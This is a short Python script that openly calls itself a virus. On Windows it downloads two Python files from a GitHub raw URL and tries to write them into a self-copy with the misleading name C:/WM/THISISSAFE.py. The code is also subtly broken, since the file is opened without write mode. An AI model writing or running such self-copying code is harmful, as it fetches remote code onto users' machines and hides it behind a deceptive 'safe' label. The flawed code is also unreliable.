import requests
import os

os_name = os.name
global OS
if os.name == 'nt':
    OS = "Windows"
elif os.name == 'posix':
    OS = "Linux"


def get_github_file_content(url):
    response = requests.get(url)
    if response.status_code == 200:
        return response.text  # Returns the raw content as a string
    else:
        raise Exception(f"Error fetching the file: {response.status_code}")
github_raw_url = "https://raw.githubusercontent.com/speedruneer/Testing/refs/heads/main/main.py"
github_raw_url_mvex = "https://raw.githubusercontent.com/speedruneer/Testing/refs/heads/main/mv_ex.py"

def create_self_copy():
    if OS == "Windows":
        if not os.path.exists("C:/WM"):
            os.makedirs("C:/WM")
            f = open("C:/WM/THISISSAFE.py")
        else:
            f = open("C:/WM/THISISSAFE.py")
        virus_self = get_github_file_content(github_raw_url)
        mv_ex = get_github_file_content(github_raw_url_mvex)
        f.write(virus_self + "\n\n# Oooh scary\n\n" + mv_ex)
    elif OS == "Linux":
        print("Really man? Linux and you downloaded a virus?")

create_self_copy()
